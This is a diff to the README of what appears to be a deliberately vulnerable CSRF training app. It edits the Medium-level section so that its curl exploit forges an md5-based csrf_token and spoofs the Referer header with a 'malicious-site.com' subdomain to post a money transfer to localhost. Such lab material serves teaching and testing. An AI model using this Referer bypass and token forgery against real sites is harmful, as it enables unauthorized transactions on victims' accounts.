@@ -15,16 +15,17 @@ The app is divided into three levels: Weak, Medium, and Strong. Each level intro
 ---
 
 ### 2. Medium Level
-- **Description**: Referer ?, not safe, at all..
-- **Info**: Using the normal get req wouldn't work, now there is a check for csrf_token 
+- **Description**: Referer bypass
+- **Info**: Using the normal get req wouldn't work, now there is a check for csrf_token
 - **Exploit Example**:
   ```bash
   # The csrf_roken is generated with md5 hash using current username 
   # (check the code), so it can be easily generated
+  # Referer bypass can be done with insecured-domain.malicious-site.com
   
   # Still you can use GET
   curl -X POST 'http:/localhost:8000/csrf/csrf?level=medium' \
-  -H "Referer: http:/localhost:8000" \
+  -H "Referer: http:/localhost:8000.domain.malicious-site.com" \
   -d "amount=32&recipient=dsads&csrf_token={generated_csrf_token}" -b cookies
 
   ```
